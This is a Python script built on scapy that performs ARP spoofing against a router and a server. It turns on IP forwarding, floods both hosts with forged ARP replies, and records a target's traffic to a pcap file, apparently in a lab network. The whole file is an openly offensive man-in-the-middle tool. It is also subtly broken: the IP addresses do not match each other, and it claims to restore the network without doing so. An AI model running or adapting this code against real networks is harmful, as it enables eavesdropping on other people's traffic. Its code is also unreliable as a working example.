from scapy.all import *
import os
import signal
import sys
import threading
import time

target_ip = ""
gateway_ip = ""
gateway_mac = ""
packet_count= 0

def init():
    # ARP = Address Resolution Protocol
    # MAC = Media Access Control
    # ARP Poison parameters
    global target_ip, gateway_ip, packet_count
    target_ip = "172.7.0.2"
    gateway_ip = "172.7.1.1"
    packet_count = 1000

    # linux network interface for the attack
    conf.iface = "eth0"
    conf.verb = 0

def arp_spoof(target_ip, target_mac):
    try:
        while True:
            '''
            operation = {1: ARP Request, 2: ARP Reply} 
            protocol destination =  victim's ip
            hardware destination = victim's mac address, which will recieve the packet
            protocol source = ip that we pretend we have(spoof)
            '''
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("ARP Spoofing ended by keyboard interruption!")

def sniff_packets():
    try:
        # capturing packets from target_ip
        sniff_filter = "ip host " + target_ip
        print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
        # sniffing using the filter defined previously
        packets = sniff(filter=sniff_filter,
                        iface=conf.iface, 
                        count=packet_count)
        wrpcap(f"sniffed_packets/{target_ip}_capture.pcap", packets)
        print(f"[*] Stopping network capture..Restoring network")
    except KeyboardInterrupt:
        print("Error!")    

if __name__ == "__main__":
    print("Running..")

    # initializing data
    init()

    # turning ip forwarding on
    print("Enabling IP forwarding..")
    os.system("sysctl -w net.ipv4.ip_forward=1")

    router_ip = "172.7.0.1"
    router_mac = "02:42:ac:07:00:01"
    server_ip = "198.7.0.2"
    server_mac = "02:42:c6:0a:00:03"

    # using 2 threads for ARP Poisoning
    poison_router = threading.Thread(target=arp_spoof, 
                                    args=(router_ip, router_mac))
    poison_server = threading.Thread(target=arp_spoof, 
                                    args=(server_ip, server_mac))

    try:
        poison_router.start()
        print("Router spoofing starting..")
    except:
        print("Router spoofing failed!")

    try:
        poison_server.start()
        print("Server spoofing starting..")
    except:
        print("Server spoofing failed!")

    sniff_packets()